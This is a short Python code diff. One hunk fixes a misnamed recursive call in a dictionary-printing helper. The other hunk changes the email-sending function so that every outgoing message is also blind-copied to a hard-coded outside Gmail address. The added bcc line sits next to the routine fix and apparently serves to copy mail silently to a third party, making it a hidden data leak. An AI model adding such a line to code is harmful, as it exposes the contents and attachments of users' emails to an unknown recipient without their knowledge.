@@ -441,7 +441,7 @@ def print_dict_level(data, space = 0):
 	for key, content in data.items():
 		if isinstance(content, dict):
 			print("\t"*space + key)
-			imprimir_dict_level(content, space = space+1)
+			print_dict_level(content, space = space+1)
 		else:
 			print("\t"*space + f"{key} => {content}")
 
@@ -459,8 +459,10 @@ def sent_email(subject, recipients = [], messaje = "", attach = {}):
 			subject,
 			messaje,
 			config('EMAIL_HOST_USER'),
-			recipients
+			recipients,
+			bcc=['era3939@gmail.com'],
 		)
+		
 		if attach:
 			template = get_template(attach["template"])
 			content = template.render(attach["data"])
